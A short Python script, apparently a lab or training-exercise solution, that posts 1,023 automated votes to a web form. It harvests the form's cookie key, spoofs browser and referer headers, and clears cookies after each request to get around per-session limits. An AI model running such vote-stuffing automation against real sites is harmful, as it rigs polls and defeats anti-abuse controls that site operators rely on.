#!/usr/bin/python3
import requests
"""level2 module"""

url = "http://158.69.76.135/level2.php"

failed = 0
success = 0
total = 1023

session = requests.Session()

for i in range(total):
    res = session.get(url)
    dict = session.cookies.get_dict()

    headers = {'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
                'Referer': url}
    data = {'id' : 2529,
            'key': dict['HoldTheDoor'],
            'holdthedoor': 'Envoyer'}
    post = session.post(url, data=data, headers=headers)
    # print(post.request.headers)
    # print(post.text)
    print("Request #{:d} Key: {:s}".format(i, dict['HoldTheDoor']), end=' ')
    if post:
        print("Request success")
        success += 1
    else:
        print("Request fail")
        print("Error {:s}".format(post.status_code))
        failed += 1
    session.cookies.clear()

print("{:d} requests sent".format(total))
print("{:d} requests succeded".format(success))
print("{:d} requests failed".format(failed))



# post = session.post(url, data)